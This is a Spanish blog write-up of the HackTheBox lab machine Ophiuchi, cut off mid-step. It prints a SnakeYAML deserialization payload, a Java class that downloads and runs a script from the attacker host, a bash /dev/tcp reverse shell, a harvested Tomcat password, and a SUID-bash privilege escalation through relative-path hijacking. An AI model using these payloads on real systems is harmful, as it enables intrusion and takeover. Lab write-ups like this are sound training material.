@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Maquina - Ophiuchu | Firtsmiracle blog</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina - Ophiuchu | Firtsmiracle blog</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina - Ophiuchu" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hoy vamos a hacer una máquina hackthebox de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de YAML para SnakeYAML utilizada en aplicaciones java, y modificando un archivo wasm para obtener privilegios de root." />
+<meta property="og:description" content="Hoy vamos a hacer una máquina hackthebox de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de YAML para SnakeYAML utilizada en aplicaciones java, y modificando un archivo wasm para obtener privilegios de root." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Ophiuchi" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Ophiuchi" />
+<meta property="og:site_name" content="Firtsmiracle blog" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Ophiuchi/banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-24T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Ophiuchi/banner.png" />
+<meta property="twitter:title" content="Maquina - Ophiuchu" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-03-24T00:00:00+00:00","datePublished":"2023-03-24T00:00:00+00:00","description":"Hoy vamos a hacer una máquina hackthebox de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de YAML para SnakeYAML utilizada en aplicaciones java, y modificando un archivo wasm para obtener privilegios de root.","headline":"Maquina - Ophiuchu","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Ophiuchi/banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Ophiuchi"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Ophiuchi"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Informacion</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina - Ophiuchu</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-03-24">24 Mar 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Ophiuchi/banner.png" alt="Maquina - Ophiuchu">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hoy vamos a hacer una máquina <code>hackthebox</code> de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de <code>YAML</code> para <code>SnakeYAML</code> utilizada en aplicaciones java, y modificando un archivo <code>wasm</code> para obtener privilegios de <code>root</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Ophiuchi
+❯ ls
+ Ophiuchi
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.227
+PING 10.10.10.227 (10.10.10.227) 56(84) bytes of data.
+64 bytes from 10.10.10.227: icmp_seq=1 ttl=63 time=124 ms
+
+--- 10.10.10.227 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 124.383/124.383/124.383/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>allPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.227 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:16 GMT
+Initiating SYN Stealth Scan at 21:16
+Scanning 10.10.10.227 [65535 ports]
+Discovered open port 8080/tcp on 10.10.10.227
+Discovered open port 22/tcp on 10.10.10.227
+Completed SYN Stealth Scan at 21:17, 18.29s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.227
+Host is up, received user-set (0.15s latency).
+Scanned at 2023-03-24 21:16:59 GMT for 18s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds
+           Raw packets sent: 90294 (3.973MB) | Rcvd: 90276 (3.611MB)
+</code></pre>
+<p>Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 8080 http.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,8080 10.10.10.227 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:21 GMT
+Nmap scan report for 10.10.10.227
+Host is up (0.27s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
+|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
+|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td>HTTP</td>
+      <td>Apache Tomcat 9.0.38</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="website---tcp-8080">Website - TCP 8080</h2>
+
+<p>Vamos a usar la herramienta <code>whatweb</code> para ver por consola el gestor de contenido de la pagina web.</p>
+
+<pre><code class="language-python">❯ whatweb http://10.10.10.227:8080
+http://10.10.10.227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10.10.10.227], Java, Title[Parse YAML]
+</code></pre>
+
+<p>El comando nos reporta algo interesante <code>Parse YAML</code></p>
+
+<p>Vamos a abrir la web y vemos que la pagina efectivamente es un <code>Yaml Parser</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Ophiuchi/web2.png" alt="" /></p>
+
+<p>Vamos a realizar una busqueda para ver si hay un exploit o vulnerabilidad relacionado a <code>Yaml Parser</code></p>
+
+<p>Encontramos un exploit publico en un repositorio de <code>github</code>:</p>
+
+<ul>
+  <li><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a>.</li>
+</ul>
+
+<p>El exploit nos habla sobre deserializacion, pero que es deserializacion?</p>
+
+<blockquote>
+  <p>Serializacion: Se refiere a un proceso por el cual se pasan un conjunto de bytes a un objeto entendible.</p>
+</blockquote>
+
+<p>En este repositorio nos habla de que mediante una deserealizacion insegura podemos conseguir <code>RCE</code> “ejecucion remota de comandos”:</p>
+
+<p>Basicamente se explota cuando una pagina tiene la funcion de parsear un archivo <code>YAML</code>.</p>
+
+<blockquote>
+  <p>¿Pero como lo validamos entonces?</p>
+</blockquote>
+
+<p>Pues en el repositorio nos muestra un codigo en <code>yaml</code> que podemos parsear en la web donde al ejecutarse podemos aprovecharlo para ejecutar una peticion a nuestra maquina.</p>
+
+<p>Para lo cual primero debemos montarnos un servidor web, usaremos <code>python</code>:</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Ophiuchi/web4.PNG" alt="" /></p>
+
+<p>Despues realizamos el parseo:</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Ophiuchi/web3.PNG" alt="" /></p>
+
+<p>y vemos como efectivamente recibimos una peticion.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Ophiuchi/web5.PNG" alt="" /></p>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Al buscar el CVE encotramos un articulo sobre la vulnerabilidad:</p>
+
+<ul>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000207">CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution</a>.</li>
+</ul>
+
+<p>Bueno entonces al pasarle nuestro payload <code>SNAKE YAML</code> llamara al constructor <code>ScriptEngineFactory</code> y este a su vez realizara una peticion a nuestra maquina.</p>
+
+<p>Vamos a descargar el repositorio que genera los payloads para poder ejecutar codigo en el sistema:</p>
+
+<ul>
+  <li><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a>.</li>
+</ul>
+
+<p>Hacemos la clonacion del repositorio:</p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/artsploit/yaml-payload
+Clonando en 'yaml-payload'...
+remote: Enumerating objects: 10, done.
+remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
+Recibiendo objetos: 100% (10/10), listo.
+❯ ls
+ yaml-payload   2021-07-03-ophiuchi.md
+
+</code></pre>
+<p>El exploit nos dice que debemos poner el codigo que deseamos ejecutar en <code>AwesomeScriptEngineFactory.java</code></p>
+
+<pre><code class="language-bash">❯ tree
+.
+├── 2021-07-03-ophiuchi.md
+└── yaml-payload
+    ├── README.md
+    └── src
+        ├── artsploit
+        │   └── AwesomeScriptEngineFactory.java
+        └── META-INF
+            └── services
+                └── javax.script.ScriptEngineFactory
+
+5 directories, 4 files
+</code></pre>
+
+<p>Observamos que se encuentra ahi el script <code>AwesomeScriptEngineFactory.java</code> lo abrimos y procedemos a modificar el codigo que queremos ejecutar</p>
+
+<pre><code class="language-java">package artsploit;
+
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
+
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec("curl http://10.10.16.4/reverse.sh -o /tmp/reverse.sh");
+            Runtime.getRuntime().exec("bash /tmp/reverse.sh");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public String getEngineName() {
+        return null;
+    }
+
+    @Override
+    public String getEngineVersion() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getExtensions() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getMimeTypes() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getNames() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageName() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageVersion() {
+        return null;
+    }
+
+    @Override
+    public Object getParameter(String key) {
+        return null;
+    }
+
+    @Override
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
+    }
+
+    @Override
+    public String getOutputStatement(String toDisplay) {
+        return null;
+    }
+
+    @Override
+    public String getProgram(String... statements) {
+        return null;
+    }
+
+    @Override
+    public ScriptEngine getScriptEngine() {
+        return null;
+    }
+}
+
+</code></pre>
+
+<p>Como vemos en el script intentaremos al momento de realizar la desearializacion se ejecute una peticion que con <code>curl</code> nos realize una peticion a un archivo el cual alojaremos een nuestra maquina y lo depositaremos en el directorio <code>tmp</code> de la maquina victima con el nombre <code>reverse.sh</code>.</p>
+
+<p>Seguidamente procederemos a crear un script en bash con el nombre <code>reverse.sh</code> el cual al ejecutarse se encargara de ejecutarnos una peticion por el puerto <code>443</code> para obtener una shell reversa.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+
+bash -i &gt;&amp; /dev/tcp/10.10.16.4/443 0&gt;&amp;1
+
+</code></pre>
+
+<p>Procedemo a compilar <code>AwesomeScriptEngineFactory.java</code> y esto nos genera un archivo</p>
+
+<pre><code class="language-bash">❯ javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+manifiesto agregado
+ignorando entrada META-INF/
+agregando: META-INF/services/(entrada = 0) (salida = 0)(almacenado 0%)
+agregando: META-INF/services/javax.script.ScriptEngineFactory(entrada = 36) (salida = 38)(desinflado -5%)
+agregando: artsploit/(entrada = 0) (salida = 0)(almacenado 0%)
+agregando: artsploit/AwesomeScriptEngineFactory.java(entrada = 1575) (salida = 420)(desinflado 73%)
+agregando: artsploit/AwesomeScriptEngineFactory.class(entrada = 1678) (salida = 705)(desinflado 57%)
+
+❯ ls
+ src   README.md   yaml-payload.jar
+</code></pre>
+
+<p>modificamos el codigo <code>YAML</code> el cual insertaremos en la pagina <code>YAML Parser</code>, para que realize una peticion a nuestra maquina en donde tendremos alojado el archivo <code>yaml-payload-jar</code> y este a su vez nos ejecutara el codigo contenido que se encargara de realizar otra peticion a nuestro archivo <code>reverse.sh</code></p>
+
+<pre><code class="language-java">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://10.10.16.4/yaml-payload.jar"]
+  ]]
+]
+</code></pre>
+<p>Montamos un servidor con <code>python</code> en donde tenemos los dos archivos:</p>
+
+<pre><code class="language-bash">❯ ls
+ src   README.md   reverse.sh   yaml-payload.jar
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>y nos ponemos en escucha con <code>ncat</code> en el puerto <code>443</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+</code></pre>
+<p>Enviamos la peticion:</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Ophiuchi/web6.PNG" alt="" /></p>
+
+<p>y estamos dentro como el usuario <code>tomcat</code>:</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Ophiuchi/web7.PNG" alt="" /></p>
+
+<p>Como siempre vamos a realizar el tratamiento de la <code>tty</code> para obtener una full interactiva.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.227.
+Ncat: Connection from 10.10.10.227:56610.
+bash: cannot set terminal process group (796): Inappropriate ioctl for device
+bash: no job control in this shell
+tomcat@ophiuchi:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+tomcat@ophiuchi:/$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+tomcat@ophiuchi:/$ export TERM=xterm
+tomcat@ophiuchi:/$ export SHELL=bash
+tomcat@ophiuchi:/$ stty rows 48 columns 184 #dependera del tamaño de tu pantalla "ejecuta stty size"
+</code></pre>
+<p>Nos dirigimos al directorio <code>home</code> y tratamos de leer la primera flag <code>user.txt</code> pero vemos que no tenemos acceso:</p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:/$ cd /home
+tomcat@ophiuchi:/home$ ls
+admin
+tomcat@ophiuchi:/home$ cd admin/
+tomcat@ophiuchi:/home/admin$ ls
+user.txt
+tomcat@ophiuchi:/home/admin$ cat user.txt 
+cat: user.txt: Permission denied
+tomcat@ophiuchi:/home/admin$
+</code></pre>
+
+<p>Como vemos que somos <code>tomcat</code>, si recordamos su estructura sabemos que existe un archivo llamado <code>tomcat-users.xml</code></p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:/home/admin$ id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+tomcat@ophiuchi:/home/admin$ find / -name tomcat-users.xml 2&gt;/dev/null
+/opt/tomcat/conf/tomcat-users.xml
+tomcat@ophiuchi:/home/admin$
+</code></pre>
+
+<p>Perfecto lo encontramos, ahora procedemos a leerlo y si efectivamente encontramos una credencial que corresponde al usuario <code>admin</code></p>
+
+<pre><code class="language-bash">&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+	version="1.0"&gt;
+&lt;user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/&gt;
+</code></pre>
+<p>Procedemos esa contraseña con el usuario <code>admin</code> y bingo!, somos el usuario ‘admin’ y ahora si podemos visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">tomcat@ophiuchi:/home/admin$ su admin
+Password: 
+admin@ophiuchi:~$ whoami
+admin
+admin@ophiuchi:~$ cat user.txt 
+330298484fe5a40840ac52e730fb7f15
+</code></pre>
+<p>Ahora anteriormente vimos en la fase de reconocimiento que el puerto <code>22</code> estaba abierto, asi que por que no probemos a conectarnos por <code>ssh</code>:</p>
+
+<pre><code class="language-bash">sshpass -p 'whythereisalimit' ssh admin@10.10.10.227
+❯ ssh admin@10.10.10.227
+The authenticity of host '10.10.10.227 (10.10.10.227)' can't be established.
+ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.227' (ECDSA) to the list of known hosts.
+admin@10.10.10.227's password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
+</code></pre>
+<p>Ejecutamos el comando <code>id</code> para ver a que grupos pertenecemos y despues ejecutamos el comado <code>sudo -l</code>, para ver si podemos ejecutar un comando como usuario privilegiado ya que somos el usuario <code>admin</code>.</p>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<pre><code class="language-bash">admin@ophiuchi:~$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+admin@ophiuchi:~$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+admin@ophiuchi:~$ 
+</code></pre>
+
+<p>Podemos ejecutar un programa llamado <code>index.go</code> usando el binario <code>/usr/bin/go</code> como <code>root</code> vale?</p>
+
+<p>Veremos como podemos aprovecharnos de esto para escalar privilegios.</p>
+
+<p>Nos dirigimos a la ruta donde se encuentra el archivo index.go.</p>
+
+<pre><code class="language-bash">admin@ophiuchi:~$ cd /opt/wasm-functions/
+admin@ophiuchi:/opt/wasm-functions$ ls
+backup  deploy.sh  index  index.go  main.wasm
+admin@ophiuchi:/opt/wasm-functions$ ls -la
+total 3928
+drwxr-xr-x 3 root root    4096 Oct 14  2020 .
+drwxr-xr-x 5 root root    4096 Oct 14  2020 ..
+drwxr-xr-x 2 root root    4096 Oct 14  2020 backup
+-rw-r--r-- 1 root root      88 Oct 14  2020 deploy.sh
+-rwxr-xr-x 1 root root 2516736 Oct 14  2020 index
+-rw-rw-r-- 1 root root     522 Oct 14  2020 index.go
+-rwxrwxr-x 1 root root 1479371 Oct 14  2020 main.wasm
+admin@ophiuchi:/opt/wasm-functions$
+</code></pre>
+
+<p>Veamos el codigo del archivo <code>ìndex.go</code> el cual podemos ejecutar:</p>
+
+<pre><code class="language-go">package main
+
+import (
+	"fmt"
+	wasm "github.com/wasmerio/wasmer-go/wasmer"
+	"os/exec"
+	"log"
+)
+
+
+func main() {
+	bytes, _ := wasm.ReadBytes("main.wasm")
+
+	instance, _ := wasm.NewInstance(bytes)
+	defer instance.Close()
+	init := instance.Exports["info"]
+	result,_ := init()
+	f := result.String()
+	if (f != "1") {
+		fmt.Println("Not ready to deploy")
+	} else {
+		fmt.Println("Ready to deploy")
+		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	}
+}
+</code></pre>
+<p>Al ejecutar el <code>index.go</code> vemos el mensaje <code>Not ready to deploy</code> el cual seria un problema por que al depender del directorio actual en el que este para ejecutarse, puedo secuestrar el archivo ‘main.wasm’</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+admin@ophiuchi:/opt/wasm-functions$
+</code></pre>
+
+<p>Volvemos a leer el script y vemos que hay una variable <code>f</code> que es diferente de <code>1</code>, y vemos que de ser lo contrario se daria la otra condicion que nos ejecutaria el <code>deploy.sh</code>, el cual podriamos tratar de manipular.</p>
+
+<pre><code class="language-go">package main
+
+import (
+	"fmt"
+	wasm "github.com/wasmerio/wasmer-go/wasmer"
+	"os/exec"
+	"log"
+)
+
+
+func main() {
+	bytes, _ := wasm.ReadBytes("main.wasm")
+
+	instance, _ := wasm.NewInstance(bytes)
+	defer instance.Close()
+	init := instance.Exports["info"]
+	result,_ := init()
+	f := result.String()
+	if (f != "1") {
+		fmt.Println("Not ready to deploy")
+	} else {
+		fmt.Println("Ready to deploy")
+		out, err := exec.Command("/bin/sh", "deploy.sh").Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println(string(out))
+	}
+}
+</code></pre>
+
+<p>Podemos ver si tenemos permiso de modificar el archivo <code>deploy.sh</code></p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+admin@ophiuchi:/opt/wasm-functions$ ls -l deploy.sh 
+-rw-r--r-- 1 root root 88 Oct 14  2020 deploy.sh
+admin@ophiuchi:/opt/wasm-functions$
+</code></pre>
+<p>Despues de ver los permisos que tenemos sobre el archivo, sabemos que no podemos modificarlo pero vimos anteriormente que el script <code>ìndex.go</code> nos ejecuta el <code>deploy.sh</code> de forma relativa, interesante; entonces yo podria crearme en el directorio <code>tmp</code> mi propio archivo <code>deploy.sh</code> y copiarme el <code>main.wasm</code> ya que me los va a pillar desde alli y se podria tensa la cosa.</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/opt/wasm-functions$ cd /tmp
+admin@ophiuchi:/tmp$ cp /opt/
+tomcat/         wasm-functions/ wasmer-go/      
+admin@ophiuchi:/tmp$ cp /opt/wasm-functions/main.wasm .
+admin@ophiuchi:/tmp$ touch deploy.sh
+admin@ophiuchi:/tmp$
+</code></pre>
+<p>En <code>deploy.sh</code> lo que voy a intentar hacer es que este script me asigne una <code>suid</code> a la <code>bash</code>, para que como cualquier usuario en el sistema pueda spamear una consola como el propietario de forma temporal.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+chmod 4755 /bin/bash
+</code></pre>
+<p>y si intentamos ejecutar nuevamente el <code>index.go</code> vemos que nuevamente nos sale.</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/tmp$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+</code></pre>
+
+<p>Entonces quiero pensar que en el archivo <code>main.wasm</code> del <code>index.go</code> debe existir una condicional que hace que la variable <code>f</code> no sea igual a <code>1</code> y por ese motivo no entra a la condicion que me ejecute el <code>deploy.sh</code>, pero si tratamos de leer el <code>main.wasm</code> no podriamos por que no es de un formato legible.</p>
+
+<p>La idea seria convertir el archivo <code>main.wasm</code> a un formato textual y hacer poder intentar alterar los valores, para ello podemos usar una herramienta disponible en github:</p>
+
+<ul>
+  <li><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></li>
+</ul>
+
+<p>Como la maquina tiene <code>python3</code> vamos a abrir un servidor web por el puerto <code>8000</code> para traernos el archivo <code>main.wasm</code></p>
+
+<pre><code class="language-bash">admin@ophiuchi:/tmp$ which python3
+/usr/bin/python3
+admin@ophiuchi:/tmp$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.16.4 - - [25/Mar/2023 01:21:42] "GET /main.wasm HTTP/1.1" 200 -
+</code></pre>
+
+<pre><code class="language-bash">wget http://10.10.10.227:8000/main.wasm
+--2023-03-25 01:21:43--  http://10.10.10.227:8000/main.wasm
